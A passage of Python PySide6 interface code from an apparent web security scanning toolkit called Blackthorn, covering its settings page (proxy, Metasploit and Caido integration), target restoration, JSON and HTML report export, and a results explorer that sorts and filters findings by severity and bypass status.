                        prefs['watermark'] = bool(wm_chk.isChecked())
                        prefs['remember_targets'] = bool(remember_chk.isChecked())
                        prefs['retry_failed'] = int(retry_spin.value())
                        # Map density index back to key
                        density_keys = ['compact', 'comfortable', 'spacious']
                        prefs['ui_density'] = density_keys[density_combo.currentIndex()]
                        prefs['language'] = new_lang
                        
                        # Save proxy settings
                        prefs['use_proxy'] = bool(use_proxy_chk.isChecked())
                        prefs['proxy_type_idx'] = proxy_type_combo.currentIndex()
                        prefs['proxy_host'] = proxy_host_edit.text().strip() or '127.0.0.1'
                        prefs['proxy_port'] = int(proxy_port_spin.value())
                        
                        # Save forensics settings
                        prefs['enable_http_logging'] = bool(http_log_chk.isChecked())
                        prefs['enable_ssl_analysis'] = bool(ssl_analysis_chk.isChecked())
                        
                        # Save privacy settings
                        prefs['censor_sites'] = bool(censor_sites_chk.isChecked())

                        # Save legacy AI shortcut settings. Full provider setup
                        # lives in the AI / Automation page.
                        prefs['anthropic_api_key'] = ai_key_edit.text().strip()
                        prefs['ai_api_key'] = ai_key_edit.text().strip()
                        prefs['ai_model'] = ai_model_edit.text().strip()

                        # Save Integrations (Metasploit + Caido) settings
                        prefs['msf_host'] = msf_host_edit.text().strip() or '127.0.0.1'
                        prefs['msf_port'] = int(msf_port_spin.value())
                        prefs['msf_password'] = msf_pw_edit.text().strip()
                        prefs['msf_workspace'] = msf_ws_edit.text().strip() or 'blackthorn'
                        prefs['msf_no_ssl'] = bool(msf_nossl_chk.isChecked())
                        prefs['caido_proxy_url'] = caido_proxy_edit.text().strip() or 'http://127.0.0.1:8080'
                        prefs['caido_route_scans'] = bool(caido_route_chk.isChecked())
                        
                        # Update instance variables
                        self._enable_http_logging = prefs['enable_http_logging']
                        self._enable_ssl_analysis = prefs['enable_ssl_analysis']
                        old_censor = getattr(self, '_censor_sites', False)
                        self._censor_sites = prefs['censor_sites']
                        
                        # Refresh tree display if censor setting changed
                        if old_censor != self._censor_sites:
                            self._refresh_tree_display()
                        
                        # Update proxy config based on settings
                        if prefs['use_proxy']:
                            idx = prefs['proxy_type_idx']
                            if idx == 0:  # Tor
                                self._proxy_config = {'type': 'socks5', 'host': '127.0.0.1', 'port': 9050}
                            elif idx == 1:  # Tor Browser
                                self._proxy_config = {'type': 'socks5', 'host': '127.0.0.1', 'port': 9150}
                            elif idx == 2:  # Burp
                                self._proxy_config = {'type': 'http', 'host': '127.0.0.1', 'port': 8080}
                            else:  # Custom
                                self._proxy_config = {'type': 'socks5', 'host': prefs['proxy_host'], 'port': prefs['proxy_port']}
                        else:
                            self._proxy_config = None
                        
                        _save_prefs(prefs)
                        self._prefs = prefs
                        self._lang = new_lang
                        self._apply_qt_prefs(prefs)
                        
                        # If language changed, ask to restart
                        if old_lang != new_lang:
                            # Save current targets before restart (use actual URLs from UserRole)
                            if bool(prefs.get('remember_targets', True)):
                                current_targets = []
                                for i in range(self.tree.topLevelItemCount()):
                                    item = self.tree.topLevelItem(i)
                                    actual_url = item.data(0, 256) or item.text(0)
                                    if actual_url:
                                        current_targets.append(actual_url)
                                prefs['last_targets'] = current_targets
                            else:
                                prefs['last_targets'] = []
                            _save_prefs(prefs)

                            self._navigate('scan')
                            reply = QMessageBox.question(
                                self,
                                _t('restart_confirm', new_lang),
                                _t('restart_confirm_msg', new_lang),
                                QMessageBox.Yes | QMessageBox.No,
                                QMessageBox.Yes
                            )
                            if reply == QMessageBox.Yes:
                                # Restart the application
                                import sys
                                import os
                                import subprocess
                                
                                if IS_FROZEN:
                                    # For frozen exe, use the actual executable path
                                    # sys.executable points to the exe itself when frozen
                                    exe_path = sys.executable
                                    # Use subprocess.Popen to start a new instance, then exit
                                    try:
                                        subprocess.Popen([exe_path], creationflags=subprocess.CREATE_NEW_PROCESS_GROUP if os.name == 'nt' else 0)
                                    except Exception:
                                        # Fallback: just try to run it
                                        subprocess.Popen([exe_path])
                                    # Close the current application cleanly
                                    QApplication.instance().quit()
                                    sys.exit(0)
                                else:
                                    # For non-frozen (development), use execl
                                    python = sys.executable
                                    os.execl(python, python, *sys.argv)
                            return
                    except Exception:
                        pass
                    # Saved — return to the Scan page.
                    self._navigate('scan')

                save_btn.clicked.connect(_save_qt)
                cancel_btn.clicked.connect(lambda: self._navigate('scan'))
                return dlg
            except Exception:
                return None

        def _apply_qt_prefs(self, prefs: dict):
            try:
                size = int(prefs.get('font_size', 11))
            except Exception:
                size = 11
            try:
                mono_candidates = ["JetBrains Mono", "Fira Code", "Consolas", "DejaVu Sans Mono", "Courier New"]
                try:
                    families = set(QFontDatabase.families())
                except Exception:
                    try:
                        families = set(QFontDatabase().families())
                    except Exception:
                        families = set()
                mono = next((f for f in mono_candidates if f in families), None)
                if mono:
                    f = QFont(mono, size)
                    self.log.setFont(f)
                else:
                    pass
            except Exception:
                pass
            show_watermark = prefs.get('watermark', True)
            try:
                self.setStyleSheet('')
            except Exception:
                pass
            try:
                density = prefs.get('ui_density', 'comfortable')
                if density == 'compact':
                    spacing = 4
                    margins = 6
                    rowheight = 20
                elif density == 'spacious':
                    spacing = 10
                    margins = 12
                    rowheight = 28
                else:
                    spacing = 6
                    margins = 8
                    rowheight = 24
                for layout in [getattr(self, '_layout_main', None), getattr(self, '_layout_top', None),
                               getattr(self, '_layout_opts', None), getattr(self, '_layout_middle', None),
                               getattr(self, '_layout_right', None), getattr(self, '_layout_bottom', None)]:
                    if layout is None:
                        continue
                    layout.setSpacing(spacing)
                    try:
                        layout.setContentsMargins(margins, margins, margins, margins)
                    except Exception:
                        pass
                try:
                    self.tree.setStyleSheet(f"QTreeWidget::item{{height:{rowheight}px;}}")
                except Exception:
                    pass
            except Exception:
                pass
            try:
                if show_watermark:
                    tmp = self._create_qt_watermark(0.08)
                    if tmp and os.path.exists(tmp):
                        try:
                            from pathlib import Path
                            css_path = Path(tmp).as_posix()
                        except Exception:
                            css_path = tmp.replace('\\', '/')
                        self.log.setStyleSheet(
                            "QTextEdit {"
                            f" background-image: url('{css_path}');"
                            " background-repeat: no-repeat; background-position: center; background-attachment: fixed;"
                            " background-color: #12161d; color: #e6eaf0;"
                            " border: 1px solid #262f3b; border-radius: 10px; padding: 8px; }"
                        )
                else:
                    self.log.setStyleSheet('')
            except Exception:
                pass

        def _restore_qt_targets(self):
            if not bool(self._prefs.get('remember_targets', True)):
                return
            targets = self._prefs.get('last_targets', [])
            if not isinstance(targets, list):
                return
            existing = {self.tree.topLevelItem(i).data(0, 256) or self.tree.topLevelItem(i).text(0) for i in range(self.tree.topLevelItemCount())}
            
            # Get persistent targets from database to match results
            persistent_map = {}
            if self._db:
                try:
                    persistent = self._db.get_persistent_targets()
                    for p in persistent:
                        persistent_map[p.get('target', '')] = p
                except Exception:
                    pass
            
            for t in targets:
                if not isinstance(t, str) or not t.strip() or t in existing:
                    continue
                
                # Check if this target has saved results in database
                p_data = persistent_map.get(t, {})
                status = p_data.get('status', 'Queued')
                findings_count = p_data.get('findings_count', 0)
                results_json = p_data.get('results_json')
                
                display_text = self._censor(t)
                status_text = f'{status} ({findings_count})' if findings_count > 0 else status.title()
                item = QTreeWidgetItem([display_text, status_text])
                item.setData(0, 256, t)  # Store actual URL in UserRole
                self.tree.addTopLevelItem(item)
                
                # Create progress bar
                self._create_progress_bar_for_item(item, t)
                
                # Set visual state based on status
                if 'done' in status.lower():
                    try:
                        item.setBackground(0, QBrush(QColor('#163f19')))
                        if t in self._progress_bars:
                            self._progress_bars[t].setValue(100)
                    except Exception:
                        pass
                
                # Restore results from database
                if results_json:
                    try:
                        results = json.loads(results_json)
                        if results:
                            self._results.extend(results)
                            self._per_target_results[t] = {'done': results, 'errors': [], 'tmp': None}
                    except Exception:
                        pass
            
            # Enable results button if we have restored results
            if self._results:
                try:
                    self.save_btn.setEnabled(True)
                    self.results_btn.setEnabled(True)
                except Exception:
                    pass

        def _create_qt_watermark(self, opacity: float = 0.08):
            try:
                if not os.path.exists(LOGO_PATH):
                    return None
                from PySide6.QtGui import QPixmap, QPainter
                from PySide6.QtCore import Qt
                pix = QPixmap(LOGO_PATH)
                if pix.isNull():
                    return None
                scaled = pix.scaled(400, 400, Qt.KeepAspectRatio, Qt.SmoothTransformation)
                tmpf = tempfile.NamedTemporaryFile(delete=False, suffix='.png')
                tmpf.close()
                trans = QPixmap(scaled.size())
                trans.fill(Qt.transparent)
                p = QPainter(trans)
                try:
                    p.setOpacity(opacity)
                    p.drawPixmap(0, 0, scaled)
                finally:
                    p.end()
                trans.save(tmpf.name)
                self._qt_watermark_tmp = tmpf.name
                return tmpf.name
            except Exception:
                return None

        def save_results(self):
            """Save results with option to save as JSON or HTML."""
            from PySide6.QtWidgets import QDialog
            
            # Create a dialog to choose format
            dlg = QtWidgets.QDialog(self)
            dlg.setWindowTitle(_t('save_as', self._lang))
            dlg.setFixedWidth(300)
            layout = QVBoxLayout(dlg)
            
            label = QLabel(_t('save_as', self._lang))
            layout.addWidget(label)
            
            btn_json = QPushButton('📄 ' + _t('save_json', self._lang))
            btn_html = QPushButton('🌐 ' + _t('save_html', self._lang))
            btn_cancel = QPushButton(_t('cancel', self._lang))
            
            layout.addWidget(btn_json)
            layout.addWidget(btn_html)
            layout.addWidget(btn_cancel)
            
            selected_format = [None]
            
            def select_json():
                selected_format[0] = 'json'
                dlg.accept()
            
            def select_html():
                selected_format[0] = 'html'
                dlg.accept()
            
            btn_json.clicked.connect(select_json)
            btn_html.clicked.connect(select_html)
            btn_cancel.clicked.connect(dlg.reject)
            
            if dlg.exec() != QDialog.DialogCode.Accepted or not selected_format[0]:
                return
            
            if selected_format[0] == 'json':
                path, _ = QFileDialog.getSaveFileName(self, _t('save', self._lang), filter='JSON (*.json)')
                if not path:
                    return
                try:
                    with open(path, 'w', encoding='utf-8') as f:
                        json.dump(self._results, f, indent=2)
                    QMessageBox.information(self, _t('saved', self._lang), f'{_t("saved", self._lang)}: {path}')
                except Exception as e:
                    QMessageBox.critical(self, _t('save_failed', self._lang), str(e))
            else:
                path, _ = QFileDialog.getSaveFileName(self, _t('save', self._lang), filter='HTML (*.html)')
                if not path:
                    return
                try:
                    self._save_html_report(path)
                    QMessageBox.information(self, _t('saved', self._lang), f'{_t("saved", self._lang)}: {path}')
                except Exception as e:
                    QMessageBox.critical(self, _t('save_failed', self._lang), str(e))

        def _save_html_report(self, path: str):
            """Generate and save an HTML report."""
            from datetime import datetime
            
            # Import CVE/CWE references
            try:
                from .database import get_cve_cwe_reference
            except ImportError:
                def get_cve_cwe_reference(t): return None
            
            severity_colors = {
                'CRITICAL': '#dc2626',
                'HIGH': '#ea580c',
                'MEDIUM': '#ca8a04',
                'LOW': '#2563eb',
                'INFO': '#6b7280'
            }
            
            # Group by target
            by_target = {}
            for r in self._results:
                target = r.get('target', 'Unknown')
                if target not in by_target:
                    by_target[target] = []
                by_target[target].append(r)
            
            # Count severities
            severity_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0, 'INFO': 0}
            for r in self._results:
                sev = r.get('severity', 'INFO')
                if sev in severity_counts:
                    severity_counts[sev] += 1
            
            # Build HTML
            html = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blackthorn Web Security Report</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f1112; color: #d7e1ea; line-height: 1.6; padding: 20px; }}
        .container {{ max-width: 1200px; margin: 0 auto; }}
        h1 {{ color: #58a6ff; margin-bottom: 10px; }}
        h2 {{ color: #d7e1ea; margin: 20px 0 10px; border-bottom: 1px solid #2b2f33; padding-bottom: 5px; }}
        h3 {{ color: #8b949e; margin: 15px 0 8px; }}
        .summary {{ display: flex; gap: 15px; flex-wrap: wrap; margin: 20px 0; }}
        .stat-card {{ background: #16181a; border: 1px solid #2b2f33; border-radius: 8px; padding: 15px 20px; min-width: 120px; }}
        .stat-card .value {{ font-size: 28px; font-weight: bold; }}
        .stat-card .label {{ color: #8b949e; font-size: 12px; }}
        .severity-CRITICAL {{ color: #dc2626; }}
        .severity-HIGH {{ color: #ea580c; }}
        .severity-MEDIUM {{ color: #ca8a04; }}
        .severity-LOW {{ color: #2563eb; }}
        .severity-INFO {{ color: #6b7280; }}
        .finding {{ background: #16181a; border: 1px solid #2b2f33; border-radius: 8px; margin: 10px 0; padding: 15px; }}
        .finding-header {{ display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }}
        .finding-technique {{ font-weight: bold; font-size: 16px; }}
        .severity-badge {{ padding: 4px 10px; border-radius: 4px; font-size: 12px; font-weight: bold; }}
        .finding-details {{ display: grid; grid-template-columns: 120px 1fr; gap: 5px 15px; font-size: 14px; }}
        .finding-details dt {{ color: #8b949e; }}
        .finding-details dd {{ color: #d7e1ea; word-break: break-all; }}
        .bypass-yes {{ color: #22c55e; }}
        .bypass-no {{ color: #ef4444; }}
        .reference-link {{ color: #58a6ff; text-decoration: none; }}
        .reference-link:hover {{ text-decoration: underline; }}
        .target-section {{ margin: 30px 0; }}
        .generated {{ color: #6b7280; font-size: 12px; margin-top: 30px; text-align: center; }}
        .cvss {{ background: #2b2f33; padding: 2px 8px; border-radius: 4px; font-size: 12px; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>Blackthorn Web Security Report</h1>
        <p style="color: #8b949e;">Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
        
        <h2>📊 Summary</h2>
        <div class="summary">
            <div class="stat-card">
                <div class="value">{len(self._results)}</div>
                <div class="label">Total Findings</div>
            </div>
            <div class="stat-card">
                <div class="value">{len(by_target)}</div>
                <div class="label">Targets Scanned</div>
            </div>
            <div class="stat-card">
                <div class="value">{len([r for r in self._results if r.get('bypass')])}</div>
                <div class="label">Bypasses Found</div>
            </div>
            <div class="stat-card">
                <div class="value severity-CRITICAL">{severity_counts['CRITICAL']}</div>
                <div class="label">Critical</div>
            </div>
            <div class="stat-card">
                <div class="value severity-HIGH">{severity_counts['HIGH']}</div>
                <div class="label">High</div>
            </div>
            <div class="stat-card">
                <div class="value severity-MEDIUM">{severity_counts['MEDIUM']}</div>
                <div class="label">Medium</div>
            </div>
        </div>
'''
            
            # Add findings by target
            html += '        <h2>🎯 Findings by Target</h2>\n'
            
            for target, findings in by_target.items():
                html += f'''        <div class="target-section">
            <h3>{target} ({len(findings)} findings)</h3>
'''
                for r in sorted(findings, key=lambda x: ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO'].index(x.get('severity', 'INFO'))):
                    technique = r.get('technique', 'Unknown')
                    severity = r.get('severity', 'INFO')
                    category = r.get('category', 'Other')
                    reason = r.get('reason', '')
                    bypass = r.get('bypass', False)
                    
                    # Get CVE/CWE reference
                    ref = get_cve_cwe_reference(technique)
                    
                    html += f'''            <div class="finding">
                <div class="finding-header">
                    <span class="finding-technique">{technique}</span>
                    <span class="severity-badge" style="background: {severity_colors.get(severity, '#6b7280')}; color: white;">{severity}</span>
                </div>
                <dl class="finding-details">
                    <dt>Category:</dt><dd>{category}</dd>
                    <dt>Bypass:</dt><dd class="{'bypass-yes' if bypass else 'bypass-no'}">{'✅ Yes' if bypass else '❌ No'}</dd>
                    <dt>Reason:</dt><dd>{reason}</dd>
'''
                    if ref:
                        html += f'''                    <dt>CVE/CWE:</dt><dd><a href="{ref.get('cwe_url', '#')}" class="reference-link" target="_blank">{ref.get('cwe_id', 'N/A')}</a> - {ref.get('cwe_name', '')}</dd>
                    <dt>CVSS:</dt><dd><span class="cvss">{ref.get('cvss_base', 'N/A')}</span></dd>
'''
                    html += '''                </dl>
            </div>
'''
                html += '        </div>\n'
            
            html += '''        <p class="generated">Report generated by Blackthorn — threat hunting and bug bounty web security toolkit</p>
    </div>
</body>
</html>'''
            
            with open(path, 'w', encoding='utf-8') as f:
                f.write(html)

        def _build_results_page(self):
            """Results explorer as an in-place page (rebuilt fresh per visit)."""
            if not self._results:
                empty = QWidget()
                empty.setObjectName('ResultsPage')
                ev = QVBoxLayout(empty)
                ev.setContentsMargins(22, 20, 22, 20)
                hdr = QLabel('◆  Results')
                hdr.setStyleSheet('font-size:18px; font-weight:bold; color:#58a6ff;')
                msg = QLabel(_t('no_results_msg', self._lang))
                msg.setStyleSheet('color:#8b949e;')
                ev.addWidget(hdr)
                ev.addWidget(msg)
                ev.addStretch()
                return empty

            # Constants
            severity_order = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']
            severity_icons = {'CRITICAL': '\U0001F534', 'HIGH': '\U0001F7E0', 'MEDIUM': '\U0001F7E1', 'LOW': '\U0001F535', 'INFO': '\u2139\ufe0f'}
            severity_colors = {'CRITICAL': '#ff4444', 'HIGH': '#ff8c00', 'MEDIUM': '#ffd700', 'LOW': '#4169e1', 'INFO': '#808080'}
            
            # Group results by target
            by_target = {}
            for r in self._results:
                # Use the actual target URL, fallback to url field if target not available
                target = r.get('target') or r.get('url') or r.get('host') or 'Unknown Target'
                # Clean up the target if it's a full URL to show just the domain
                if target and target != 'Unknown Target':
                    try:
                        from urllib.parse import urlparse
                        parsed = urlparse(target)
                        if parsed.netloc:
                            target = parsed.netloc
                        elif parsed.path and not parsed.scheme:
                            # Handle cases like 'example.com' without scheme
                            target = parsed.path.split('/')[0]
                    except Exception:
                        pass
                if target not in by_target:
                    by_target[target] = []
                by_target[target].append(r)
            
            dlg = QtWidgets.QWidget()
            dlg.setObjectName('ResultsPage')
            dlg.setStyleSheet("""
                QWidget#ResultsPage { background-color: #0f1112; }
                QLabel { color: #d7e1ea; }
                QListWidget { background-color: #16181a; color: #d7e1ea; border: 1px solid #2b2f33; }
                QListWidget::item { padding: 8px; border-bottom: 1px solid #2b2f33; }
                QListWidget::item:selected { background-color: #3b82f6; }
                QListWidget::item:hover { background-color: #2b2f33; }
                QTreeWidget { background-color: #16181a; color: #d7e1ea; border: 1px solid #2b2f33; }
                QTreeWidget::item { padding: 4px; }
                QTreeWidget::item:selected { background-color: #3b82f6; }
                QComboBox { background-color: #16181a; color: #d7e1ea; border: 1px solid #2b2f33; padding: 5px; }
                QComboBox::drop-down { border: none; }
                QComboBox QAbstractItemView { background-color: #16181a; color: #d7e1ea; selection-background-color: #3b82f6; }
                QPushButton { background-color: #2b2f33; color: #d7e1ea; border: none; padding: 8px 16px; border-radius: 4px; }
                QPushButton:hover { background-color: #3b3f43; }
                QCheckBox { color: #d7e1ea; }
                QGroupBox { color: #d7e1ea; border: 1px solid #2b2f33; margin-top: 10px; padding-top: 10px; }
                QGroupBox::title { subcontrol-origin: margin; left: 10px; padding: 0 5px; }
            """)
            
            main_layout = QHBoxLayout(dlg)
            
            # === LEFT PANEL: Site List ===
            left_panel = QVBoxLayout()
            left_panel.setSpacing(10)
            
            # Header
            sites_header = QLabel(_t('sites', self._lang))
            sites_header.setFont(QFont('', 12, QFont.Bold))
            sites_header.setStyleSheet('color: #d7e1ea; padding: 5px;')
            left_panel.addWidget(sites_header)
            
            # "All Sites" option
            site_list = QtWidgets.QListWidget()
            site_list.setFixedWidth(280)
            
            # Add "All Sites" first
            all_item = QtWidgets.QListWidgetItem(f'{_t("all_sites", self._lang)} ({len(self._results)} {_t("findings", self._lang)})')
            all_item.setData(256, '__ALL__')  # Qt.UserRole = 256
            site_list.addItem(all_item)
            
            # Add individual sites with counts
            for target, items in sorted(by_target.items()):
                # Count by severity
                crit = len([r for r in items if r.get('severity') == 'CRITICAL'])
                high = len([r for r in items if r.get('severity') == 'HIGH'])
                med = len([r for r in items if r.get('severity') == 'MEDIUM'])
                
                # Create display text with severity indicators
                indicators = []
                if crit > 0:
                    indicators.append(f'\U0001F534{crit}')
                if high > 0:
                    indicators.append(f'\U0001F7E0{high}')
                if med > 0:
                    indicators.append(f'\U0001F7E1{med}')
                
                indicator_str = ' '.join(indicators) if indicators else ''
                # Apply censoring to displayed target
                display_target = self._censor(target)
                display = f'{display_target}\n   {len(items)} findings  {indicator_str}'
                
                item = QtWidgets.QListWidgetItem(display)
                item.setData(256, target)  # Qt.UserRole = 256 - store actual target
                site_list.addItem(item)
            
            left_panel.addWidget(site_list, 1)
            
            # Statistics summary at bottom of left panel
            stats_label = QLabel()
            total = len(self._results)
            bypasses = len([r for r in self._results if r.get('bypass', False)])
            stats_label.setText(f'{_t("total", self._lang)}: {total} | {_t("bypasses", self._lang)}: {bypasses}')
            stats_label.setStyleSheet('color: #808080; padding: 5px;')
            left_panel.addWidget(stats_label)
            
            main_layout.addLayout(left_panel)
            
            # === RIGHT PANEL: Results View ===
            right_panel = QVBoxLayout()
            right_panel.setSpacing(10)
            
            # Controls bar
            controls = QHBoxLayout()
            
            # Sort options
            sort_label = QLabel(_t('sort_by', self._lang))
            sort_combo = QtWidgets.QComboBox()
            sort_combo.addItems([
                _t('severity_high_low', self._lang),
                _t('severity_low_high', self._lang),
                _t('technique_az', self._lang),
                _t('technique_za', self._lang),
                _t('category', self._lang),
                _t('bypass_status', self._lang)
            ])
            sort_combo.setFixedWidth(200)
            controls.addWidget(sort_label)
            controls.addWidget(sort_combo)
            
            controls.addSpacing(20)
            
            # Filter options
            filter_label = QLabel(_t('filter', self._lang))
            filter_combo = QtWidgets.QComboBox()
            filter_combo.addItems([
                _t('all_results', self._lang),
                _t('critical_only', self._lang),
                _t('high_only', self._lang),
                _t('medium_only', self._lang),
                _t('low_only', self._lang),
                _t('info_only', self._lang),
                _t('bypasses_only', self._lang),
                _t('non_bypasses_only', self._lang)
            ])
            filter_combo.setFixedWidth(180)
            controls.addWidget(filter_label)
            controls.addWidget(filter_combo)
            
            right_panel.addLayout(controls)
            
            # Search bar row
            search_row = QHBoxLayout()
            search_label = QLabel('🔍 ' + _t('search', self._lang))
            search_edit = QLineEdit()
            search_edit.setPlaceholderText(_t('search_placeholder', self._lang))
            search_edit.setStyleSheet('''
                QLineEdit {
                    background-color: #16181a;
                    color: #d7e1ea;
                    border: 1px solid #2b2f33;
                    border-radius: 4px;
                    padding: 6px 10px;
                }
                QLineEdit:focus {
                    border: 1px solid #3b82f6;
                }
            ''')
            search_clear_btn = QPushButton('✕')
            search_clear_btn.setFixedWidth(30)
            search_clear_btn.setStyleSheet('QPushButton { padding: 4px; }')
            search_clear_btn.clicked.connect(lambda: search_edit.clear())
            
            search_row.addWidget(search_label)
            search_row.addWidget(search_edit, 1)
            search_row.addWidget(search_clear_btn)
            search_row.addSpacing(20)
            
            # Expand/Collapse buttons
            expand_btn = QPushButton(_t('expand_all', self._lang))
            collapse_btn = QPushButton(_t('collapse_all', self._lang))
            search_row.addWidget(expand_btn)
            search_row.addWidget(collapse_btn)
            
            right_panel.addLayout(search_row)
            
            # Results tree
            results_tree = QTreeWidget()
            results_tree.setColumnCount(4)
            results_tree.setHeaderLabels([_t('technique', self._lang), _t('severity', self._lang), _t('category', self._lang), _t('reason', self._lang)])
            results_tree.setAlternatingRowColors(True)
            results_tree.setSortingEnabled(False)  # We'll handle sorting manually
            
            try:
                results_tree.header().setSectionResizeMode(0, QHeaderView.ResizeToContents)
                results_tree.header().setSectionResizeMode(1, QHeaderView.Fixed)
                results_tree.setColumnWidth(1, 100)
                results_tree.header().setSectionResizeMode(2, QHeaderView.ResizeToContents)
                results_tree.header().setSectionResizeMode(3, QHeaderView.Stretch)
            except Exception:
                pass
            
            right_panel.addWidget(results_tree, 1)
            
            # Details section
            details_group = QtWidgets.QGroupBox(_t('details', self._lang))
            details_layout = QVBoxLayout(details_group)
            details_text = QTextEdit()
            details_text.setReadOnly(True)
            details_text.setMaximumHeight(200)
            details_text.setStyleSheet('background-color: #16181a; border: none;')
            details_layout.addWidget(details_text)
            right_panel.addWidget(details_group)
            
            main_layout.addLayout(right_panel, 1)
            
            # === LOGIC FUNCTIONS ===
            def get_filtered_sorted_results(target_key, sort_idx, filter_idx, search_text=''):
                """Get results for a target with sorting, filtering, and search applied."""
                if target_key == '__ALL__':
                    results = list(self._results)
                else:
                    results = list(by_target.get(target_key, []))
                
                # Apply search filter
                if search_text:
                    search_lower = search_text.lower()
                    results = [r for r in results if 
                        search_lower in r.get('technique', '').lower() or
                        search_lower in r.get('category', '').lower() or
                        search_lower in r.get('reason', '').lower() or
                        search_lower in r.get('target', '').lower() or
                        search_lower in r.get('severity', '').lower()
                    ]
                
                # Apply filter
                if filter_idx == 1:  # CRITICAL only
                    results = [r for r in results if r.get('severity') == 'CRITICAL']
                elif filter_idx == 2:  # HIGH only
                    results = [r for r in results if r.get('severity') == 'HIGH']
                elif filter_idx == 3:  # MEDIUM only
                    results = [r for r in results if r.get('severity') == 'MEDIUM']
                elif filter_idx == 4:  # LOW only
                    results = [r for r in results if r.get('severity') == 'LOW']
                elif filter_idx == 5:  # INFO only
                    results = [r for r in results if r.get('severity') == 'INFO']
                elif filter_idx == 6:  # Bypasses only
                    results = [r for r in results if r.get('bypass', False)]
                elif filter_idx == 7:  # Non-bypasses only
                    results = [r for r in results if not r.get('bypass', False)]
                
                # Apply sort
                if sort_idx == 0:  # Severity High to Low
                    results.sort(key=lambda x: severity_order.index(x.get('severity', 'INFO')) if x.get('severity', 'INFO') in severity_order else 99)
                elif sort_idx == 1:  # Severity Low to High
                    results.sort(key=lambda x: severity_order.index(x.get('severity', 'INFO')) if x.get('severity', 'INFO') in severity_order else 99, reverse=True)
                elif sort_idx == 2:  # Technique A-Z
                    results.sort(key=lambda x: x.get('technique', '').lower())
                elif sort_idx == 3:  # Technique Z-A
                    results.sort(key=lambda x: x.get('technique', '').lower(), reverse=True)
                elif sort_idx == 4:  # Category
                    results.sort(key=lambda x: x.get('category', 'Other'))
                elif sort_idx == 5:  # Bypass Status
                    results.sort(key=lambda x: (0 if x.get('bypass', False) else 1, severity_order.index(x.get('severity', 'INFO')) if x.get('severity', 'INFO') in severity_order else 99))
                
                return results
            
            def build_finding_detail_html(r):
                """Build the rich HTML detail for a finding. Shared by the inline
                accordion (expand-on-click) and the bottom Details panel so both
                render identically. Additive: reuses the same data the panel used."""
                import html as _html
                bypass_status = '✅ BYPASS SUCCESSFUL' if r.get('bypass', False) else '❌ No bypass'
                sev = r.get('severity', 'INFO')
                technique = r.get('technique', 'Unknown')
                exploit_desc = _get_exploit_description(technique)

                # CVE/CWE references (prefer values already on the finding, else lookup)
                cve_cwe_html = ''
                try:
                    from .database import get_cve_cwe_reference
                    ref = get_cve_cwe_reference(technique)
                    if ref:
                        cve_id = r.get('cve_id') or ref.get('cve', 'N/A')
                        cwe_id = r.get('cwe_id') or ref.get('cwe', 'N/A')
                        cvss_score = r.get('cvss_score') or ref.get('cvss', 0.0)
                        ref_desc = ref.get('description', '')
                        ref_url = r.get('reference_url') or ref.get('reference', '')
                        common_cves = ref.get('common_cves', [])
                        try:
                            cvss_val = float(cvss_score)
                        except (TypeError, ValueError):
                            cvss_val = 0.0
                        if cvss_val >= 9.0:
                            cvss_color, cvss_label = '#ff3333', 'CRITICAL'
                        elif cvss_val >= 7.0:
                            cvss_color, cvss_label = '#ff8c00', 'HIGH'
                        elif cvss_val >= 4.0:
                            cvss_color, cvss_label = '#ffd700', 'MEDIUM'
                        else:
                            cvss_color, cvss_label = '#90ee90', 'LOW'
                        cwe_num = str(cwe_id).replace('CWE-', '')
                        cve_cwe_html = f"""
                        <hr style='border: 1px solid #2b2f33; margin: 8px 0;'>
                        <b>\U0001F510 {_t('cve_cwe_references', self._lang)}:</b><br>
                        <table style='margin-top: 5px; color: #d7e1ea;'>
                            <tr><td><b>CVE:</b></td><td style='padding-left: 10px;'><a href='https://cve.mitre.org/cgi-bin/cvename.cgi?name={cve_id}' style='color: #66b3ff;'>{cve_id}</a></td></tr>
                            <tr><td><b>CWE:</b></td><td style='padding-left: 10px;'><a href='https://cwe.mitre.org/data/definitions/{cwe_num}.html' style='color: #66b3ff;'>{cwe_id}</a></td></tr>
                            <tr><td><b>CVSS:</b></td><td style='padding-left: 10px;'><span style='color: {cvss_color}; font-weight: bold;'>{cvss_score} ({cvss_label})</span></td></tr>
                        </table>
                        """
                        if r.get('cvss_vector'):
                            cve_cwe_html += f"<p style='color:#a0aab5; font-size:11px;'><b>Vector:</b> <code>{_html.escape(str(r.get('cvss_vector')))}</code></p>"
                        if ref_desc:
                            cve_cwe_html += f"<p style='color: #a0aab5; font-size: 11px; margin-top: 5px;'>{ref_desc}</p>"
                        if ref_url:
                            cve_cwe_html += f"<p><a href='{ref_url}' style='color: #66b3ff; font-size: 11px;'>\U0001F4DA {_t('reference_link', self._lang)}</a></p>"
                        if common_cves:
                            common_cves_links = ', '.join([f"<a href='https://cve.mitre.org/cgi-bin/cvename.cgi?name={cve}' style='color: #66b3ff;'>{cve}</a>" for cve in common_cves[:3]])
                            cve_cwe_html += f"<p style='font-size: 11px;'><b>{_t('related_cves', self._lang)}:</b> {common_cves_links}</p>"
                except Exception:
                    pass

                # Request summary (method / url / status / size / payload) when present
                req_bits = []
                if r.get('method'):
                    req_bits.append(f"<b>Method:</b> {_html.escape(str(r.get('method')))}")
                _url = r.get('url') or r.get('path')
                if _url:
                    req_bits.append(f"<b>URL:</b> {_html.escape(str(_url))}")
                _status = r.get('status') if r.get('status') is not None else r.get('response_code')
                if _status is not None:
                    req_bits.append(f"<b>Status:</b> {_html.escape(str(_status))}")
                if r.get('size') is not None:
                    req_bits.append(f"<b>Size:</b> {_html.escape(str(r.get('size')))}")
                req_html = ''
                if req_bits:
                    req_html = ("<hr style='border:1px solid #2b2f33; margin:8px 0;'>"
                                "<b>\U0001F310 Request</b><br><span style='color:#a0aab5; font-size:11px;'>"
                                + ' &nbsp;|&nbsp; '.join(req_bits) + "</span>")
                if r.get('payload'):
